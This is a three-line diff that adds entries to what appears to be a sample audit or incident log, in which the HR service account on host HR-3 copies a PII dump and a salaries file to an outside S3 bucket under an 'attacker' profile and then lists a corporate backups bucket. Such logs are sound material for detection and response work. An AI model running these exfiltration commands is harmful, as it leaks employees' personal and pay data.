@@ -1,0 +1,3 @@
+2026-05-15T09:48:11Z host=HR-3 user=svc_hr cmd="aws --profile attacker s3 cp pii_dump.csv s3://REDACTED/dumps/pii_dump_20260515.csv"
+2026-05-15T09:50:22Z host=HR-3 user=svc_hr cmd="aws --profile attacker s3 cp salaries.xlsx s3://REDACTED/dumps/salaries_20260515.xlsx"
+2026-05-15T11:18:42Z host=HR-3 user=svc_hr cmd="aws s3 ls s3://corp-backups-prod/"
